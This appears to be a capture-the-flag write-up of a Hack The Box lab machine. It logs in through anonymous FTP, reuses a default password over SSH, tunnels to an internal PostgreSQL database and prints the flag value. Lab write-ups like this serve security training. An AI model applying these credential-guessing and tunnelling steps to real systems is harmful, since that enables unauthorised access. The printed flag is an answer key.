---- 
## Initial Information

- Attacker IP = 10.10.14.136
- Victim IP = 10.129.198.223
---

## Initial Scan
```shell


nmap -sV 10.129.198.223                                               

Nmap scan report for 10.129.198.223
Host is up (0.098s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

Nmap done: 1 IP address (1 host up) scanned in 2.41 seconds
```
- Initial scan shows that FTP an ssh are open on ports 21 and 23 respectively 
- Tried to login using the default credentials anonymous@`<IP>`  and no password this was successful
```shell
ftp anonymous@10.129.198.223
Connected to 10.129.198.223.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

downloaded the files  attached and added did a grep search inorder to get emails from the  welcome email
```shell
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" welcome_28112022 
root@funnel.htb
optimus@funnel.htb
albert@funnel.htb
andreas@funnel.htb
christine@funnel.htb
maria@funnel.htb

```
- looking at the password policy document I found that the password policy states that each new user uses a default password *funnel123#!#*
- I enumerated through the emails using the name to try to login using ssh.
- I found that Christine has not changed her password
```shell
ssh christine@10.129.198.223 


christine@funnel:~$ 

```

- tried to run nmap on the local ip to see what hidden services are running but the current user doesn't have nmap so ran ss -a this gave a list of all the services that are running.
```shell
christine@funnel:~$ ss -tln
State      Recv-Q     Send-Q          Local Address:Port            Peer Address:Port     Process     
LISTEN     0          4096                127.0.0.1:34421                0.0.0.0:*                    
LISTEN     0          4096            127.0.0.53%lo:53                   0.0.0.0:*                    
LISTEN     0          128                   0.0.0.0:22                   0.0.0.0:*                    
LISTEN     0          4096                127.0.0.1:5432                 0.0.0.0:*                    
LISTEN     0          32                          *:21                         *:*                    
LISTEN     0          128                      [::]:22                      [::]:*                    
christine@funnel:~$ ss -tl
State      Recv-Q     Send-Q         Local Address:Port               Peer Address:Port    Process    
LISTEN     0          4096               127.0.0.1:34421                   0.0.0.0:*                  
LISTEN     0          4096           127.0.0.53%lo:domain                  0.0.0.0:*                  
LISTEN     0          128                  0.0.0.0:ssh                     0.0.0.0:*                  
LISTEN     0          4096               127.0.0.1:postgresql              0.0.0.0:*                  
LISTEN     0          32                         *:ftp                           *:*                  
LISTEN     0          128                     [::]:ssh                        [::]:*     
```

- As we cannot access the database with the local machine we need to use **Local Port Forwarding** This is the reason why nmap scan couldn't find anything as it is only locally accessable
- On the victim machine 
```shell

ssh -L 1337:localhost:5432 christine@10.129.198.223
```


- Make the second connection to create the intersection
```shell
sudo -u postgres psql -U christine -h localhost -p 1337

```

- used `\`l and `\c` to find an select the secrets table to investigate
- then used `\`dt to dump the tables  which finds the flag table
![[Pasted image 20230329191348.png]]


```shell
christine=# \c secrets
You are now connected to database "secrets" as user "christine".
secrets=# \dt
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)

secrets=# select * from flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)

```




---
## Resources
 - Finding the port 5432 is for postgres: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
 - how to setup a localport forward :https://www.section.io/engineering-education/ssh-tunneling/